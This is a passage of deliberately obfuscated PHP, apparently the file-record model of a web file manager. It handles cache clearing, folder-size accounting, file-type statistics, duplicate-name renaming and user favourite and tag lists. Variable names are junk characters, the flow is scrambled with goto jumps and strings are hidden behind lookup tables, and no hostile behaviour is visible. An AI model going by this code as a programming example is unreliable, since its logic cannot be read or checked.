$C¤Š˜ïŸª‚; $A•Å„“‘‚º = _get(self::$cacheSourceInfo, $eæËÌòŒàº); if ($A•Å„“‘‚º) { return $A•Å„“‘‚º; } goto FöÈ×Êé—; dù¢‘ä÷: } public function sourceCacheClear($c‡·Œ²àÈ = false) { self::cacheClear($c‡·Œ²àÈ); } public static function cacheClear($Añè¼è‚ï = false) { $aÈ¨—»²Œá =& $_SERVER[¢ÌÛ]; if ($Añè¼è‚ï == !1) { goto eâìÏãƒ¶ç; DÛÉµ½Âë¼: return; goto CôèĞè©; CÊï¦×ºê˜: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto DÛÉµ½Âë¼; eâìÏãƒ¶ç: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto CÊï¦×ºê˜; CôèĞè©: } unset(self::$cacheSourceInfo[$aÈ¨—»²Œá[436] . $Añè¼è‚ï]); unset(self::$cachePathInfoMore[$Añè¼è‚ï]); unset(self::$cachePathInfo[$aÈ¨—»²Œá[1942] . $Añè¼è‚ï]); unset(self::$cachePathInfo[$aÈ¨—»²Œá[1943] . $Añè¼è‚ï]); } public function metaSet($b‚¥œ‰è°ò, $cŞàÇª‹ñ = null, $cĞß»¤ÂËÇ = null) { $BÊõ‘Œ‡£– = parent::metaSet($b‚¥œ‰è°ò, $cŞàÇª‹ñ, $cĞß»¤ÂËÇ); if ($BÊõ‘Œ‡£–) { $this->sourceCacheClear($b‚¥œ‰è°ò); } return $BÊõ‘Œ‡£–; } public function pathInfoByPath($bƒ°â¯›¶, $D¤®¯ßÙ®) { $f‡Ã„ß´ñŠ =& $_SERVER[¢ÌÛ]; $Aø×¨íÒ¹› = !$D¤®¯ßÙ® ? array() : explode($f‡Ã„ß´ñŠ[8], trim($D¤®¯ßÙ®, $f‡Ã„ß´ñŠ[8])); $FÚªìÔ“£ = $bƒ°â¯›¶; foreach ($Aø×¨íÒ¹› as $d °©…ÛÂî) { $a Œ¤Ä©­ö = array($f‡Ã„ß´ñŠ[488] => $FÚªìÔ“£, $f‡Ã„ß´ñŠ[28] => $d °©…ÛÂî); $dÇ®ÓÕÇ‹Ï = $this->where($a Œ¤Ä©­ö)->select(); if (!$dÇ®ÓÕÇ‹Ï) { return !1; } $dÇ®ÓÕÇ‹Ï = array_sort_by($dÇ®ÓÕÇ‹Ï, $f‡Ã„ß´ñŠ[423]); $FÚªìÔ“£ = $dÇ®ÓÕÇ‹Ï[0][$f‡Ã„ß´ñŠ[396]]; } return $this->pathInfo($FÚªìÔ“£, !0); } protected function updateModifyTime($dƒÂ‡¼Æ¬È) { goto b°Ç®ˆë±; BœÙ¥‘ƒ‰: $this->where($e‰©ïì³ğ°)->save($d­êî¡Óê); goto FáÁ’ Åæ; b°Ç®ˆë±: $fğªïµÑÔ® =& $_SERVER[¢ÌÛ]; if (!$dƒÂ‡¼Æ¬È) { return; } if (!is_array($dƒÂ‡¼Æ¬È)) { $dƒÂ‡¼Æ¬È = array($dƒÂ‡¼Æ¬È); } goto A¸àÙ‹à„Î; A¸àÙ‹à„Î: foreach ($dƒÂ‡¼Æ¬È as $f§ˆÉ³â ¾ => $AééôÕœÌ) { $dƒÂ‡¼Æ¬È[$f§ˆÉ³â ¾] = intval($AééôÕœÌ); $this->sourceCacheClear($AééôÕœÌ); } $e‰©ïì³ğ° = array($fğªïµÑÔ®[396] => array($fğªïµÑÔ®[7], $dƒÂ‡¼Æ¬È)); $d­êî¡Óê = array($fğªïµÑÔ®[550] => USER_ID, $fğªïµÑÔ®[417] => time()); goto BœÙ¥‘ƒ‰; FáÁ’ Åæ: } public function folderSizeReset($F¬­§ŞŸÙò, $béËÓ ¨Ë = false) { goto F­ÄŠÉÕ ; D¢ÁÖÇ©Æ‘: if ($béËÓ ¨Ë == 0) { return CacheLock::unlock($eí¶×ƒ¢Û‡); } $CÁ§£ ”®Ã = $this->parentLevelArray($dÑ¾ÓÒí¿‹[$BÉ“ô­êÊ÷[486]]); if (!$CÁ§£ ”®Ã) { $CÁ§£ ”®Ã = array(); } goto C¯¿¾ÄñîÈ; C¯¿¾ÄñîÈ: $CÁ§£ ”®Ã[] = $dÑ¾ÓÒí¿‹[$BÉ“ô­êÊ÷[396]]; $eÌÉ¹Ğˆ = array($BÉ“ô­êÊ÷[396] => array($BÉ“ô­êÊ÷[411], $CÁ§£ ”®Ã)); if ($béËÓ ¨Ë < 0) { $eÌÉ¹Ğˆ[$BÉ“ô­êÊ÷[77]] = array($BÉ“ô­êÊ÷[949], abs($béËÓ ¨Ë)); } goto e äî¿´×; F­ÄŠÉÕ : $BÉ“ô­êÊ÷ =& $_SERVER[¢ÌÛ]; if ($this->statusIgnoreResetSpace) { return; } $dÑ¾ÓÒí¿‹ = $this->sourceInfo($F¬­§ŞŸÙò); goto AßÂ¡÷ÔĞ¤; e äî¿´×: $this->where($eÌÉ¹Ğˆ)->setAdd($BÉ“ô­êÊ÷[77], $béËÓ ¨Ë); CacheLock::unlock($eí¶×ƒ¢Û‡); $this->targetSpaceUpdate($dÑ¾ÓÒí¿‹[$BÉ“ô­êÊ÷[398]], $dÑ¾ÓÒí¿‹[$BÉ“ô­êÊ÷[483]]); goto D¼­Ğ±Øˆæ; AßÂ¡÷ÔĞ¤: $eí¶×ƒ¢Û‡ = $BÉ“ô­êÊ÷[1944] . $F¬­§ŞŸÙò; CacheLock::lock($eí¶×ƒ¢Û‡, 20); if ($béËÓ ¨Ë === !1) { $this->sourceCacheClear($F¬­§ŞŸÙò); $dÑ¾ÓÒí¿‹ = $this->sourceInfo($F¬­§ŞŸÙò); $eÌÉ¹Ğˆ = array($BÉ“ô­êÊ÷[395] => $F¬­§ŞŸÙò, $BÉ“ô­êÊ÷[422] => 0); $c¹ËÛÃ«Øº = $this->where($eÌÉ¹Ğˆ)->sum($BÉ“ô­êÊ÷[77]); $béËÓ ¨Ë = intval($c¹ËÛÃ«Øº) - intval($dÑ¾ÓÒí¿‹[$BÉ“ô­êÊ÷[77]]); } goto D¢ÁÖÇ©Æ‘; D¼­Ğ±Øˆæ: } public function folderSizeResetChildren($eŠíŞ¢©Û) { goto Aì‘•‡Ù«„; BêËˆ¤¥³¯: $DÉª“íçí[$CùÔƒ„»¢Ÿ[397]] = 0; $eïäÈôê‡ë = $this->field($FáÅ¨¿ø¡ø)->where($DÉª“íçí)->select(); if (!$eïäÈôê‡ë) { return; } goto eØª„µˆˆê; eØª„µˆˆê: $c¾áÈÃÔ¡°[] = $fØˆÜÓËé·; $c¾áÈÃÔ¡° = array_to_keyvalue($c¾áÈÃÔ¡°, $CùÔƒ„»¢Ÿ[396]); foreach ($c¾áÈÃÔ¡° as $E¬¿‚’â·‰ => $e›„š—„Â ) { $c¾áÈÃÔ¡°[$E¬¿‚’â·‰][$CùÔƒ„»¢Ÿ[1946]] = $c¾áÈÃÔ¡°[$E¬¿‚’â·‰][$CùÔƒ„»¢Ÿ[77]]; $c¾áÈÃÔ¡°[$E¬¿‚’â·‰][$CùÔƒ„»¢Ÿ[77]] = 0; } goto fĞïœê­ñ; fĞïœê­ñ: foreach ($eïäÈôê‡ë as $e›„š—„Â ) { $f±÷ÏÁëâÅ = $e›„š—„Â [$CùÔƒ„»¢Ÿ[488]] . $CùÔƒ„»¢Ÿ[33]; if (!isset($c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ])) { continue; } if ($e›„š—„Â [$CùÔƒ„»¢Ÿ[423]] == $c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ][$CùÔƒ„»¢Ÿ[423]]) { $c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ][$CùÔƒ„»¢Ÿ[77]] += $e›„š—„Â [$CùÔƒ„»¢Ÿ[77]]; } } foreach ($c¾áÈÃÔ¡° as $e›„š—„Â ) { $dÂÈ¼‰á–¹ = $this->parentLevelArray($e›„š—„Â [$CùÔƒ„»¢Ÿ[486]]); foreach ($dÂÈ¼‰á–¹ as $f±÷ÏÁëâÅ) { $f±÷ÏÁëâÅ = $f±÷ÏÁëâÅ . $CùÔƒ„»¢Ÿ[33]; if (!isset($c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ])) { continue; } if ($e›„š—„Â [$CùÔƒ„»¢Ÿ[423]] == $c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ][$CùÔƒ„»¢Ÿ[423]]) { $c¾áÈÃÔ¡°[$f±÷ÏÁëâÅ][$CùÔƒ„»¢Ÿ[77]] += $e›„š—„Â [$CùÔƒ„»¢Ÿ[77]]; } } } $AÌ—åÀƒÙÂ = array(); goto bø…ğ‘†·š; bø…ğ‘†·š: foreach ($c¾áÈÃÔ¡° as $e›„š—„Â ) { if ($e›„š—„Â [$CùÔƒ„»¢Ÿ[77]] == $e›„š—„Â [$CùÔƒ„»¢Ÿ[1946]]) { continue; } $AÌ—åÀƒÙÂ[] = array($CùÔƒ„»¢Ÿ[396], $e›„š—„Â [$CùÔƒ„»¢Ÿ[396]], $CùÔƒ„»¢Ÿ[77], $e›„š—„Â [$CùÔƒ„»¢Ÿ[77]]); } $this->saveAll($AÌ—åÀƒÙÂ); goto dßÉ‡Şˆ£; Aì‘•‡Ù«„: $CùÔƒ„»¢Ÿ =& $_SERVER[¢ÌÛ]; $this->sourceCacheClear($eŠíŞ¢©Û); $fØˆÜÓËé· = $this->sourceInfo($eŠíŞ¢©Û); goto EÄï‹ÜØ×; EÄï‹ÜØ×: $DÉª“íçí = array($CùÔƒ„»¢Ÿ[544] => 1, $CùÔƒ„»¢Ÿ[551] => array($CùÔƒ„»¢Ÿ[510], $fØˆÜÓËé·[$CùÔƒ„»¢Ÿ[486]] . $eŠíŞ¢©Û . $CùÔƒ„»¢Ÿ[511])); $FáÅ¨¿ø¡ø = $CùÔƒ„»¢Ÿ[1945]; $c¾áÈÃÔ¡° = $this->field($FáÅ¨¿ø¡ø)->where($DÉª“íçí)->select(); goto BêËˆ¤¥³¯; dßÉ‡Şˆ£: } public function userSpaceReset($C¿ŒÔßĞ×‰ = false) { $Dé¦èğÆ¸Š =& $_SERVER[¢ÌÛ]; $e·Ù¼³¡´ö = $this->where(array($Dé¦èğÆ¸Š[398] => self::TYPE_USER, $Dé¦èğÆ¸Š[483] => $C¿ŒÔßĞ×‰, $Dé¦èğÆ¸Š[397] => 0))->sum($Dé¦èğÆ¸Š[77]); Model($Dé¦èğÆ¸Š[501])->userEdit($C¿ŒÔßĞ×‰, array($Dé¦èğÆ¸Š[1643] => $e·Ù¼³¡´ö)); } public function targetSpaceUpdate($cŒÑ‘¾çÊ, $f×™Îë‘±´) { $DÅ ¯Áø›Á =& $_SERVER[¢ÌÛ]; if (!$f×™Îë‘±´) { return; } if (!in_array($cŒÑ‘¾çÊ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $aÀó¯­ò¼ = $this->targetSpaceSize($cŒÑ‘¾çÊ, $f×™Îë‘±´); if ($cŒÑ‘¾çÊ == self::TYPE_USER) { Model($DÅ ¯Áø›Á[501])->userEdit($f×™Îë‘±´, array($DÅ ¯Áø›Á[1643] => $aÀó¯­ò¼)); } else { if ($cŒÑ‘¾çÊ == self::TYPE_GROUP) { Model($DÅ ¯Áø›Á[485])->groupEdit($f×™Îë‘±´, array($DÅ ¯Áø›Á[1643] => $aÀó¯­ò¼)); } } } public function targetSpaceSize($AƒÂ—¾à‰­, $f‡ËÜëõèù) { goto B×¬Ëçï½À; B×¬Ëçï½À: $Fèô”Óˆ­Ñ =& $_SERVER[¢ÌÛ]; $A¬÷œÃ‹Ô« = $this->sourceRoot($AƒÂ—¾à‰­, $f‡ËÜëõèù, !0); if (!$A¬÷œÃ‹Ô«) { return 0; } goto A…®¦øİì; AÎÊ¨«‹ÎÙ: $d›õÜø¶“ = array_to_keyvalue($d›õÜø¶“, $Fèô”Óˆ­Ñ[33], $Fèô”Óˆ­Ñ[396]); $d›õÜø¶“ = array_unique(array_filter($d›õÜø¶“)); if ($d›õÜø¶“) { $CÅ¬šÔ•«± = array($Fèô”Óˆ­Ñ[410] => array($Fèô”Óˆ­Ñ[411], $d›õÜø¶“)); $eí¤çŒ’õË += floatval($this->where($CÅ¬šÔ•«±)->sum($Fèô”Óˆ­Ñ[77])); } goto c³¹”ÂÅ¢; A…®¦øİì: $eí¤çŒ’õË = floatval($A¬÷œÃ‹Ô«[$Fèô”Óˆ­Ñ[77]]); $CÅ¬šÔ•«± = array($Fèô”Óˆ­Ñ[551] => array($Fèô”Óˆ­Ñ[510], $Fèô”Óˆ­Ñ[497] . $A¬÷œÃ‹Ô«[$Fèô”Óˆ­Ñ[396]] . $Fèô”Óˆ­Ñ[511])); $d›õÜø¶“ = Model($Fèô”Óˆ­Ñ[421])->field($Fèô”Óˆ­Ñ[410])->where($CÅ¬šÔ•«±)->select(); goto AÎÊ¨«‹ÎÙ; c³¹”ÂÅ¢: return $eí¤çŒ’õË; goto EÓÒà›Ş; EÓÒà›Ş: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($a‰¨­±´×“) { return $this->fileTypeProfile($a‰¨­±´×“, SourceModel::TYPE_USER); } public function groupFileTypeProfile($aÈâ“”¿†Ö) { return $this->fileTypeProfile($aÈâ“”¿†Ö, SourceModel::TYPE_GROUP); } private function fileTypeProfile($CÑõçÃ¢³õ, $d­«¬Ù«½¹) { goto c³÷é”³Œ; c³÷é”³Œ: $e…çØƒõö =& $_SERVER[¢ÌÛ]; $F†’¯Øë¨• = $e…çØƒõö[1947] . $CÑõçÃ¢³õ . $e…çØƒõö[70] . $d­«¬Ù«½¹; $dÆ¶§¼•Éö = Cache::get($F†’¯Øë¨•); goto CÙ“äÓ¸ªŠ; C«ŞÔóœš…: foreach ($aÃ¬È ‚å¤ as $e‰ˆªŠ—¸ã => $Eä–×¤Óù·) { $Aµµ™ù¾ó[$e…çØƒõö[399]] = $this->fileTypeWhere($e‰ˆªŠ—¸ã); $aÀó±¹¢[$e‰ˆªŠ—¸ã] = array($e…çØƒõö[1949] => $Eä–×¤Óù·[$e…çØƒõö[28]], $e…çØƒõö[1950] => $this->where($Aµµ™ù¾ó)->count(), $e…çØƒõö[546] => $this->where($Aµµ™ù¾ó)->sum($e…çØƒõö[77])); } Cache::set($F†’¯Øë¨•, $aÀó±¹¢, 1200); return $aÀó±¹¢; goto dİùñ©Âİ; aÂ‘øåĞô: $aÀó±¹¢ = array(); $aÀó±¹¢[$e…çØƒõö[1948]] = array($e…çØƒõö[1949] => LNG($e…çØƒõö[1948]), $e…çØƒõö[1950] => $this->where($Aµµ™ù¾ó)->count(), $e…çØƒõö[546] => $this->where($Aµµ™ù¾ó)->sum($e…çØƒõö[77])); $aÃ¬È ‚å¤ = KodIO::fileTypeList(); goto C«ŞÔóœš…; CÙ“äÓ¸ªŠ: if ($dÆ¶§¼•Éö) { return $dÆ¶§¼•Éö; } $Aµµ™ù¾ó = array($e…çØƒõö[544] => 0); if ($CÑõçÃ¢³õ != !1) { $Aµµ™ù¾ó[$e…çØƒõö[483]] = $CÑõçÃ¢³õ; $Aµµ™ù¾ó[$e…çØƒõö[398]] = $d­«¬Ù«½¹; } goto aÂ‘øåĞô; dİùñ©Âİ: } public function fileNameExist($D±’Œ—¼ƒ, $Cø¤Ğ¢î˜˜) { $c½Ö‹·æ =& $_SERVER[¢ÌÛ]; $d«ô¨Œ†¤ = $this->childList($D±’Œ—¼ƒ); foreach ($d«ô¨Œ†¤ as $bˆÉèá°Ñ) { if ($bˆÉèá°Ñ[$c½Ö‹·æ[28]] == $Cø¤Ğ¢î˜˜) { return $bˆÉèá°Ñ[$c½Ö‹·æ[396]]; } if (strtolower($bˆÉèá°Ñ[$c½Ö‹·æ[28]]) == strtolower($Cø¤Ğ¢î˜˜)) { return $bˆÉèá°Ñ[$c½Ö‹·æ[396]]; } } return !1; } public function childList($Dæ§°†„‹¼) { goto fÃ‡ä£Àâ; b»ÒÓ¨æ„™: self::$cacheChildList[$A¶ªÇ‚‘³„] = $BÓµ¶Şš©‰; foreach ($BÓµ¶Şš©‰ as $e—ğªÈŠæ) { $A¶ªÇ‚‘³„ = $cÚ©°ÅĞ¾â[436] . $e—ğªÈŠæ[$cÚ©°ÅĞ¾â[396]]; self::$cacheSourceInfo[$A¶ªÇ‚‘³„] = $e—ğªÈŠæ; } return $BÓµ¶Şš©‰; goto D”øö± ; fÃ‡ä£Àâ: $cÚ©°ÅĞ¾â =& $_SERVER[¢ÌÛ]; $A¶ªÇ‚‘³„ = $cÚ©°ÅĞ¾â[1927] . $Dæ§°†„‹¼; if (isset(self::$cacheChildList[$A¶ªÇ‚‘³„])) { return self::$cacheChildList[$A¶ªÇ‚‘³„]; } goto CÉ°ÛßÓõ; CÉ°ÛßÓõ: $b«ÂŸ†–İÍ = array($cÚ©°ÅĞ¾â[488] => intval($Dæ§°†„‹¼), $cÚ©°ÅĞ¾â[423] => 0); $BÓµ¶Şš©‰ = $this->where($b«ÂŸ†–İÍ)->select(); $BÓµ¶Şš©‰ = $BÓµ¶Şš©‰ ? $BÓµ¶Şš©‰ : array(); goto b»ÒÓ¨æ„™; D”øö± : } public function fileNameAuto($E±Ñ’áÄô, $Fˆ«‡‚Ó„ì, $FŠÓ‚”ñ¼ = REPEAT_RENAME, $DøÇ‚£íÔ = false) { $A¡É³‘Òö =& $_SERVER[¢ÌÛ]; $B‘³ùç¡«Ğ = $this->childList($E±Ñ’áÄô); $dË™àî“‘¯ = array_to_keyvalue($B‘³ùç¡«Ğ, $A¡É³‘Òö[33], $A¡É³‘Òö[28]); return $this->fileNameAutoGet($dË™àî“‘¯, $Fˆ«‡‚Ó„ì, $FŠÓ‚”ñ¼, $DøÇ‚£íÔ); } public function fileNameAutoGet($cŠ¾–²¾ƒï, $FÏÖ·»–Ê˜, $e¢é‚õÑŞç, $CÍ„Œ‡Ù¯) { $aãç——À‹ =& $_SERVER[¢ÌÛ]; if ($e¢é‚õÑŞç == REPEAT_REPLACE || !$cŠ¾–²¾ƒï || !in_array_not_case($FÏÖ·»–Ê˜, $cŠ¾–²¾ƒï) || $CÍ„Œ‡Ù¯ && $e¢é‚õÑŞç != REPEAT_RENAME_FOLDER) { return $FÏÖ·»–Ê˜; } if ($e¢é‚õÑŞç == REPEAT_SKIP) { return !1; } $DÎ£Ââæ = $aãç——À‹[94] . get_path_ext($FÏÖ·»–Ê˜); $DÎ£Ââæ = $DÎ£Ââæ == $aãç——À‹[94] || $CÍ„Œ‡Ù¯ ? $aãç——À‹[33] : $DÎ£Ââæ; for ($a¨¯›†­ = 1; $a¨¯›†­ <= count($cŠ¾–²¾ƒï) + 1; $a¨¯›†­++) { $EÇ‘ŸÚ†š = substr($FÏÖ·»–Ê˜, 0, strlen($FÏÖ·»–Ê˜) - strlen($DÎ£Ââæ)); $AÅÎæÌÕ¹Ä = $EÇ‘ŸÚ†š . "\x28{$a¨¯›†­}\x29{$DÎ£Ââæ}"; if (!in_array_not_case($AÅÎæÌÕ¹Ä, $cŠ¾–²¾ƒï)) { return $AÅÎæÌÕ¹Ä; } } } } goto e··–Šî„; Bˆ’Ê¿ğ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\155\145" => "\x69\x6f\137\x73\x6f\165\x72\143\x65\137\x6d\x65\164\141", "\x6d\145\x74\x61\106\x69\145\154\144" => "\163\x6f\x75\x72\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\162\164", "\x66\165\x6e\x63\164\151\x6f\156"), array("\x63\x72\x65\141\164\x65\124\151\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\164", "\146\165\156\143\164\x69\x6f\156"), array("\x76\x69\x65\167\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\165\156\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($d¡öàí“–“) { return $this->listSource(array($_SERVER[¢ÌÛ][395] => $d¡öàí“–“)); } public function typeName($c„å·ƒÑ®) { static $e¸íÁíÈÃ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $e¸íÁíÈÃ[$c„å·ƒÑ® . $_SERVER[¢ÌÛ][33]]; } public function sourceListInfo($Fò¦¯ÛŠø©, $Aèæ•ÚÂ Ï = false) { goto Fè©×¼·Õ¨; Fè©×¼·Õ¨: $bÜõŠÀœ÷ =& $_SERVER[¢ÌÛ]; $Fò¦¯ÛŠø© = $Fò¦¯ÛŠø© ? $Fò¦¯ÛŠø© : array(); $Fò¦¯ÛŠø© = array_filter(array_unique($Fò¦¯ÛŠø©)); goto E×¿Éñ˜‚ƒ; E×¿Éñ˜‚ƒ: if (!$Fò¦¯ÛŠø©) { return array(); } $F“ùœ³–ß÷ = $this->where(array($bÜõŠÀœ÷[396] => array($bÜõŠÀœ÷[7], $Fò¦¯ÛŠø©)))->select(); $this->_listDataApply($F“ùœ³–ß÷, $Aèæ•ÚÂ Ï); goto E÷†ŒòºÙ; E÷†ŒòºÙ: return array_to_keyvalue($F“ùœ³–ß÷, $bÜõŠÀœ÷[396]); goto bõ¦ŒäÆ¼ˆ; bõ¦ŒäÆ¼ˆ: } public function pathInfoFilter($Fìµ‚îåŠÊ) { goto F”¤ğÉùÃ²; eÈ©ù¹‹ò: $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[398]] = $this->typeName($Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[398]]); if ($Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[397]] != 1) { $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[167]] = $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[399]]; unset($Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[399]]); } $e«äÊ’ŠËÛ = $A¦¸™³ŒåÓ[400]; goto EÄÇ«… à‰; EÄÇ«… à‰: $e«äÊ’ŠËÛ .= $A¦¸™³ŒåÓ[401]; $e«äÊ’ŠËÛ .= $A¦¸™³ŒåÓ[402]; $D¼Ÿ…‰ªŒ = explode($A¦¸™³ŒåÓ[47], $e«äÊ’ŠËÛ); goto Cš‹›Åİ™Û; F”¤ğÉùÃ²: $A¦¸™³ŒåÓ =& $_SERVER[¢ÌÛ]; $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[75]] = KodIO::make($Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[396]]); $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[29]] = $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[397]] == 1 ? $A¦¸™³ŒåÓ[76] : $A¦¸™³ŒåÓ[173]; goto eÈ©ù¹‹ò; Cš‹›Åİ™Û: if (isset($Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[403]]) && $Fìµ‚îåŠÊ[$A¦¸™³ŒåÓ[403]][$A¦¸™³ŒåÓ[404]] == -1) { $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[192]); $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[83]); $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[405]); $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[406]); $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[77]); $D¼Ÿ…‰ªŒ = array_remove_value($D¼Ÿ…‰ªŒ, $A¦¸™³ŒåÓ[407]); } $Fìµ‚îåŠÊ = array_field_key($Fìµ‚îåŠÊ, $D¼Ÿ…‰ªŒ); return $Fìµ‚îåŠÊ; goto f³ƒïÀö•Ç; f³ƒïÀö•Ç: } public function listUserFav() { goto cÖèĞÆ”…°; A¤È´¼’÷: foreach ($dëÖÏÅ¸ƒ as &$c ²ëŒ—‰š) { $c ²ëŒ—‰š = array($aŒåŒÏ³Û[412] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[385]], $aŒåŒÏ³Û[413] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[28]], $aŒåŒÏ³Û[414] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[75]], $aŒåŒÏ³Û[415] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[29]], $aŒåŒÏ³Û[416] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[192]], $aŒåŒÏ³Û[417] => $c ²ëŒ—‰š[$aŒåŒÏ³Û[83]]); if ($c ²ëŒ—‰š[$aŒåŒÏ³Û[29]] == $aŒåŒÏ³Û[409] && $aœáŸÆå¸[$c ²ëŒ—‰š[$aŒåŒÏ³Û[75]]]) { $c ²ëŒ—‰š[$aŒåŒÏ³Û[84]] = $aœáŸÆå¸[$c ²ëŒ—‰š[$aŒåŒÏ³Û[75]]]; } } unset($c ²ëŒ—‰š); return $dëÖÏÅ¸ƒ; goto dŒ½Ì¥Õ»; CÆÇœ•¢ß: $B—Ûƒ’º¯ = array_to_keyvalue($B—Ûƒ’º¯, $aŒåŒÏ³Û[33], $aŒåŒÏ³Û[75]); if ($B—Ûƒ’º¯) { $aœáŸÆå¸ = $this->listSource(array($aŒåŒÏ³Û[410] => array($aŒåŒÏ³Û[411], $B—Ûƒ’º¯))); } $aœáŸÆå¸ = array_to_keyvalue($aœáŸÆå¸[$aŒåŒÏ³Û[363]], $aŒåŒÏ³Û[396]); goto A¤È´¼’÷; cÖèĞÆ”…°: $aŒåŒÏ³Û =& $_SERVER[¢ÌÛ]; $dëÖÏÅ¸ƒ = Model($aŒåŒÏ³Û[408])->listData(); $B—Ûƒ’º¯ = array_filter_by_field($dëÖÏÅ¸ƒ, $aŒåŒÏ³Û[29], $aŒåŒÏ³Û[409]); goto CÆÇœ•¢ß; dŒ½Ì¥Õ»: } public function listUserTag($d•’Áİ†“ª) { goto F™ª¬´ğ§¼; DÈÒ‹¸†‚¦: $AÕ¶½Šğ¸¼ = array_to_keyvalue($eÅÑŞ•ĞÓÜ[$eÒ­‡ö¦Œ»[73]], $eÒ­‡ö¦Œ»[33], $eÒ­‡ö¦Œ»[396]); $c…ã‚ÃÈÒê = array_merge($AÕ¶½Šğ¸¼, $AìØ¶¯ †‚); foreach ($FÕá‡”Í¡ as $fâ–ì»º¦) { if (!in_array($fâ–ì»º¦, $c…ã‚ÃÈÒê)) { $DÓ¿Ú×ˆË[] = $fâ–ì»º¦; } } goto C…¹—«¨ï; EÖÆÕõª©‚: $E¾¾šùï = array(); foreach ($fŠê·»Œ‚ê as $FÍà‰ßÍ•Ê) { $fâ–ì»º¦ = $FÍà‰ßÍ•Ê[$eÒ­‡ö¦Œ»[75]]; if (!$fâ–ì»º¦) { continue; } if (!isset($E¾¾šùï[$fâ–ì»º¦])) { $E¾¾šùï[$fâ–ì»º¦] = array(); } $E¾¾šùï[$fâ–ì»º¦][] = $FÍà‰ßÍ•Ê[$eÒ­‡ö¦Œ»[419]]; } $FÕá‡”Í¡ = array(); goto C‹«Ä’‹; C…¹—«¨ï: if ($DÓ¿Ú×ˆË) { Model($eÒ­‡ö¦Œ»[420])->removeBySource($DÓ¿Ú×ˆË); } return $eÅÑŞ•ĞÓÜ; goto eäËôôÌŸ; F™ª¬´ğ§¼: $eÒ­‡ö¦Œ» =& $_SERVER[¢ÌÛ]; if ($d•’Áİ†“ª && !is_array($d•’Áİ†“ª)) { $d•’Áİ†“ª = array($d•’Áİ†“ª); } $fŠê·»Œ‚ê = Model($eÒ­‡ö¦Œ»[418])->listData(); goto EÖÆÕõª©‚; E£Æ÷‰Ğ–¨: if (!$eÅÑŞ•ĞÓÜ || count($FÕá‡”Í¡) == $eÅÑŞ•ĞÓÜ[$eÒ­‡ö¦Œ»[360]][$eÒ­‡ö¦Œ»[361]]) { return $eÅÑŞ•ĞÓÜ; } $DÓ¿Ú×ˆË = array(); $AìØ¶¯ †‚ = array_to_keyvalue($eÅÑŞ•ĞÓÜ[$eÒ­‡ö¦Œ»[74]], $eÒ­‡ö¦Œ»[33], $eÒ­‡ö¦Œ»[396]); goto DÈÒ‹¸†‚¦; C‹«Ä’‹: foreach ($E¾¾šùï as $fã¬øŠ°ŞÇ => $b‘ÉŸµÇ¡) { $DÛ¦§ˆÔ¢â = !0; if (!$d•’Áİ†“ª) { $FÕá‡”Í¡[] = $fã¬øŠ°ŞÇ; continue; } foreach ($d•’Áİ†“ª as $B…¨¡Æ¢­„) { if (!in_array($B…¨¡Æ¢­„, $b‘ÉŸµÇ¡)) { $DÛ¦§ˆÔ¢â = !1; break; } } if ($DÛ¦§ˆÔ¢â) { $FÕá‡”Í¡[] = $fã¬øŠ°ŞÇ; } } if (!$FÕá‡”Í¡) { return array(); } $eÅÑŞ•ĞÓÜ = $this->listSource(array($eÒ­‡ö¦Œ»[410] => array($eÒ­‡ö¦Œ»[411], $FÕá‡”Í¡))); goto E£Æ÷‰Ğ–¨; eäËôôÌŸ: } public function listUserRecycle() { $aÂ“Ø­ë¦ =& $_SERVER[¢ÌÛ]; $Eô–¢ø£Œõ = Model($aÂ“Ø­ë¦[421])->listData(); if (!$Eô–¢ø£Œõ) { return array(); } $b£–ñˆÇ‘† = array($aÂ“Ø­ë¦[410] => 